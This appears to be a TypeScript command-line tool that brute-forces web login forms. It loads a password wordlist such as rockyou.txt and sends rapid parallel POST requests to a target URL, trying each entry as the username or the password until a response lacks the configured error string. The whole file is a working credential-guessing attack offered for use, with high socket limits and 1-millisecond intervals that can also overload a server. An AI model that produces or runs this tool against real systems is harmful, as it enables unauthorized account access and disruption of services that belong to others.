//importations
import yargs from 'yargs'
import { hideBin } from 'yargs/helpers';
import fs from 'fs'
import https from 'https'
import axios from 'axios'
import dns from 'dns/promises'

//flags
const yarg= yargs(hideBin(process.argv))
.option("url",{demandOption:true,type:"string"})
.option("wordlist",{default:"/usr/share/wordlists/rockyou.txt"})
.option("username",{type:"boolean"}) // if you want to crack for bruteforce the username, you put --username true
.option("error",{default:"error"})
.option("body",{default:`{"username":"","password":""}`,type:"string"})
.option("password",{type:"boolean"}) // if you want to crack for bruteforce the password, you put --password true
.option("v",{type:"number",default:10})
.option("content",{default:"application/json"})
.parseSync()


//variable declarations

let body= JSON.parse(yarg.body)
let urloriginal= yarg.url



const urlObj= new URL(urloriginal)

const agent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 1000,
  maxSockets: 200,          
  maxFreeSockets: 200,        
  maxTotalSockets: 300,      
  timeout: 60000,
  scheduling: 'lifo',
  servername: urlObj.hostname
})


let ip= (await dns.lookup(urlObj.hostname)).address

urlObj.hostname=ip

const trueurl= urlObj.href

console.log("url:",trueurl)
let wordlist= fs.readFileSync(yarg.wordlist).toString().split("\n")
let error= yarg.error
let content= yarg.content
let velocidad= yarg.v

let usernamebody= Object.keys(body)[0]
let passwordbody= Object.keys(body)[1]

let passw=""
let user=""

let found=false

let contador=0
let workers=0


//functions declaracions


async function worker(){ console.log("worker iniciado")
   setInterval(() => {
              if(yarg.password===true){
                  let passw:any= wordlist.shift()
        try{
            
            body[passwordbody]=passw; 
            axios.post(trueurl,body,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data]}).then(function(data){return data.data}).then(function(data){
                if(data.includes(error)){++contador; console.log("contraseña incorrecta:",passw,"contador:",contador)}
                else{console.log("contraseña encontrada:",passw,"html:",data),found=true}
            }).catch(function(error){console.log("error:",error)})

        }catch(error){console.log("error",error); wordlist.unshift(passw)}
        
    }

    else{let user:any= wordlist.shift()
         try{
              
            body[usernamebody]=user;
             axios.post(trueurl,body,{headers:{"Content-Type":content},httpsAgent:agent, transformResponse: [(data) => data]}).then(function(data){return data.data}).then(function(data){
                if(data.includes(error)){++contador; console.log("usuario incorrecto:",user,"contador:",contador)}
                else{console.log("usuario encontrado:",user),found=true}
            })
           
        }catch(error){console.log("error:",error); wordlist.unshift(user)}
    }

   }, 1); 
   


   
}

//code

console.warn("WARNING: in the body the username comes first and the password comes second. NO excepctions")

if(yarg.username===true && yarg.password===true){console.log("you can't to crack the username and password at the same time"); process.exit(1)}
if(!yarg.username && !yarg.password){console.log("Specify what you want to crack");process.exit(1)}



while(workers<velocidad){ console.log("workers:",workers,"velocidad:",velocidad)
    worker(); ++workers
}



